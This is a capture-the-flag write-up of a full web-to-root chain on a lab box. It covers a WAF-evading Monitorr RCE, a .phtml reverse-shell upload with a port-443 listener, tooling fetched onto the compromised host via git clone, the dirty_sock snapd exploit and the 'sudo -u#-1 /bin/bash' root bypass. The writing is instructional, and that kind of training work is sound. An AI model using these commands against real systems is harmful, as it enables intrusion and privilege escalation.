Year of The Jellyfish: an n-day web exploit chain to a sudo UID bypass

A public exploit that gets flagged as an attack on sight. A content filter that only checks a file's magic bytes. A crude shell with just enough tools to bootstrap better ones. And a sudo rule that blocks root by name, but not by number.

Room: Year of The Jellyfish Category: Web / Linux Privesc Tools: searchsploit, Linux Exploit Suggester, dirty_sock

The setup: a multi-subdomain host running a known-vulnerable monitoring dashboard. The job: find and adapt a working public exploit, get code execution past two separate upload filters, then escalate through a kernel-adjacent CVE and a subtly broken sudo rule.

Flags are omitted below, even the original notes blanked them out before taking the screenshot.

The Investigation

1
Map the environment from its own TLS certificate

The site's TLS certificate lists four Subject Alternative Names on a single cert, essentially handing over the host's internal naming scheme for free. Adding all four to /etc/hosts against the target IP brings every subdomain into scope at once.

Why this works

A SAN certificate covering multiple subdomains is reconnaissance the server hands you voluntarily. Checking a cert's alt names costs nothing and regularly reveals hosts a directory brute force would take far longer to find.

2
Identify the app and find a working n-day

One subdomain runs Monitorr, a self-hosted uptime dashboard, and its own settings page prints the exact version in the footer: 1.7.6. Searchsploit turns up two candidates:

searchsploit monitorr

An authorization-bypass script targets an installer endpoint that's already been removed on this build, a dead end. The second, a remote-code-execution script, targets an upload endpoint that's still very much alive, and reading through its source reveals the upload directory path before a single request is even sent.

Why this works

Reading an exploit script's source before running it is worth the extra few minutes. One candidate saved a trip entirely, and the other handed over useful reconnaissance (the real upload path) just from the request it was built to send.

3
Get past a WAF that recognizes the exploit itself

Running the public script as-is fails outright, and the stock output gives no real reason why. Patching the script to print the raw response body is what actually explains it:

r = requests.post(url, headers=headers, data=data, verify=True, cookies=cookies)
print(r.text)

The response body reads, almost literally, "You are an exploit." Something upstream is fingerprinting the request itself, most likely the exact header or payload shape the public script is known to send, not the vulnerability it exploits. A self-signed certificate adds a second, unrelated hurdle, solved by disabling TLS verification in the script for this internal target.

Why this works

A signature-based filter trained on a specific, widely circulated public exploit script is defeated the moment the request looks even slightly different from that exact script's fingerprint. Printing the actual server response during debugging is what turns "it just doesn't work" into an actionable next step.

4
Confirm a content filter, not just an extension filter

A reverse shell disguised with a .gif extension uploads successfully this time, no WAF complaint. But the listener never catches a connection. Requesting the uploaded file back directly explains why:

curl https://<target>/assets/data/usrimg/<uploaded-file>

The response is a literal GIF89a... header, the server is serving it, and apparently treating it, as a real image. The upload pipeline is validating file content, not just trusting the extension, and the shell code never gets a chance to run as PHP.

Why this works

An extension alone tells a filter nothing about what's actually inside a file. Confirming that the server is both accepting the upload and serving it back as image content, rather than guessing, is what rules out a pure extension-based bypass and points toward needing a different kind of trick.

5
Find the extension the filter forgot

PHP will execute several extensions beyond the obvious .php, and .phtml is one commonly missing from hand-rolled blocklists that only enumerate the usual suspects. Re-uploading under that extension, with a new filename since the server rejects exact duplicates, finally gets a shell that actually executes server-side.

One more obstacle: the initial callback port never connects. Switching the reverse shell's target port to 443, a port outbound firewall rules almost always permit, gets a connection back immediately:

nc -lvnp 443

A shell lands as www-data on a host identifying itself as petshop.

Why this works

A filter built around a short, obvious extension list almost always misses the long tail of extensions a web server is actually configured to execute. And outbound firewalls shaping which ports can even leave the network are just as important to account for as any upload filter.

6
Stage better tools through a tool already on the box

The shell this filter chain allows is a crude one, no proper terminal, limited commands. Rather than fight file transfer, git is already installed on the target, so privilege-escalation tooling comes in by cloning it directly from GitHub:

git clone https://github.com/mzet-/linux-exploit-suggester.git
Why this works

A low-grade shell doesn't need to block tool transfer entirely, it just rules out some of the usual paths. Whatever's already installed on the target, a package manager, an interpreter, a version control client, is worth checking as a delivery mechanism before assuming nothing will work.

7
Let a suggester tool narrow down the privesc path

Linux Exploit Suggester fingerprints the kernel and distribution, then cross-references both against a database of known escalation paths. Against this box's kernel and Ubuntu version, one match stands out: CVE-2019-7304, nicknamed "dirty_sock", a local privilege escalation through snapd's API.

python3 dirty_sockv2.py

The exploit abuses snapd's local socket to install, then remove, a trojan snap package, a side effect of which is a brand-new local user with sudo rights.

Why this works

A suggester tool doesn't replace manual enumeration, but it does triage dozens of theoretical exploits down to the handful that actually match the box in front of you, kernel version, architecture, and installed packages all narrow the field fast.

8
Upgrade the shell to actually use the new account

The exploit succeeds, but switching to the newly created user requires a real terminal, something the current shell doesn't have. A standard Python PTY upgrade fixes that:

python3 -c "import pty; pty.spawn('/bin/bash')"
export TERM=xterm

With an interactive terminal in place, su into the new account succeeds, and sudo -l confirms it can run /bin/bash as any user except root, a (ALL, !root) rule.

Why this works

Several common post-exploitation steps, including su, simply refuse to run without a controlling terminal. The PTY upgrade trick isn't optional polish here, it's the one thing standing between a shell and actually using the credentials just obtained.

9
Defeat "not root" by not naming root at all

A sudo rule that blocks a user by the literal string root has a well-known hole: specifying a user by numeric UID instead of by name sidesteps a name-based check entirely. Passing -1 as the UID underflows to 0, root's real UID:

sudo -u#-1 /bin/bash

That lands a root shell directly, no exploit left to chain, just one line.

Why this works

(ALL, !root) excludes the username root, but sudo still accepts a raw numeric UID for the -u flag. -1 isn't a valid signed UID, so it wraps around to UID 0 in the underlying system call, the exact same account the rule was trying to block, just addressed a different way.

Full Attack Chain

TLS cert SANs → 4 subdomains mapped
  → Monitorr 1.7.6 identified, searchsploit finds a live RCE script
       → WAF signature defeated by not replicating the public script's fingerprint
            → GIF extension bypass fails: content filter serves it as a real image
                 → .phtml extension + port 443 callback: shell as www-data
                      → git clone: Linux Exploit Suggester staged on target
                           → CVE-2019-7304 (dirty_sock) creates a new sudo user
                                → PTY upgrade, su into the new account
                                     → sudo -u#-1 /bin/bash: UID wraparound to root

Takeaways

Signature-based filters protect against known tools, not known bugs

The WAF here wasn't detecting the vulnerability, it was fingerprinting one specific public exploit script. A slightly different request sailed right past it.

Content filters need to be confirmed, not assumed

Requesting the uploaded file back and reading what the server actually returned was what revealed a real content check, rather than guessing based on the upload "succeeding."

A sudo exclusion by username is not a security boundary

!root blocks exactly one string. Any equivalent way to reference the same UID, numeric syntax included, walks straight around it.
